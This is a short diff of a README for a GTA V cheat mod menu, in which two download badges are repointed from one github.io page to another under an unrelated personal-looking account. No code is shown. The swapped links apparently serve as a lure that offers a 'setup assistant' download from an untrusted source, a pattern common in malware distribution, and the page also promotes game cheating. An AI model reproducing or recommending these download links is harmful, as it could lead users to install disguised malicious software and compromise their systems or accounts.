@@ -1,7 +1,7 @@
 # 🚗 Kiddion’s Mod Menu — Visual Control Assistant for GTA V Enhancements
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://cheat-mod-menu-for-kiddions.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=rockstar)](https://cheat-mod-menu-for-kiddions.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://shirleycaisaguano9.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=rockstar)](https://shirleycaisaguano9.github.io/.github/)
 
 ---
 
